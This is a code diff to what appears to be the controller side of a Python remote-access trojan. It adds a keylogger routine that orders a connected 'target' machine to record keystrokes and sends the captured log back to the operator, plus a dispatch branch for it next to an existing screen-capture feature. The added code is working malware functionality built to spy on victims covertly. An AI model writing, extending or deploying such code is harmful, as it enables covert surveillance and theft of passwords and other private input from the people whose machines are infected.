@@ -342,6 +342,30 @@ def sendfile(conn,cmd):
     output=conn.recv(20480).decode()
     print(output,end="")
 
+# to log keys at client side and recieve log file - keylogger command
+def keyLogger(conn):
+    print("Logging keys...")
+    conn.send("log".encode())
+    res=conn.recv(1024).decode()
+    if res == "done":
+        print("Logging of keys done until ESC is pressed by client or keys pressed exceed 50 key presses")
+    conn.send("ok".encode())
+    l=int(conn.recv(20480).decode())
+    print("Extracting logs")
+    conn.send("start".encode())
+    f=open("logs.txt","w")
+    curr_len=0
+    while curr_len<l:
+        print(end="\r")
+        data=conn.recv(204800)
+        curr_len+=len(data)
+        f.write(data.decode())
+        print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
+    f.close()
+    print("\nLogs recieved")
+    conn.send("receive".encode())
+    output=conn.recv(20480).decode()
+    print(output,end="")
 
 # Function for sending commands to target machine
 def send_target_commands(conn):
@@ -364,6 +388,12 @@ def send_target_commands(conn):
                 client_response=str(conn.recv(20480),"utf-8")   # now we need to accept data from client which will contain output of our command executed on client's terminal
                                                                # conn.recv() takes an arguement which is maximum number of bytes that can be recieved at once
                                                                # conn.recv() return data in bytes which needs to be converted in utf-8 format anf then converted to str format
+            
+            if client_response == "Logging_keys":
+                keyLogger(conn)
+                continue         
+
+
             if client_response == "capturing":
                 screenCapture(conn)
                 continue
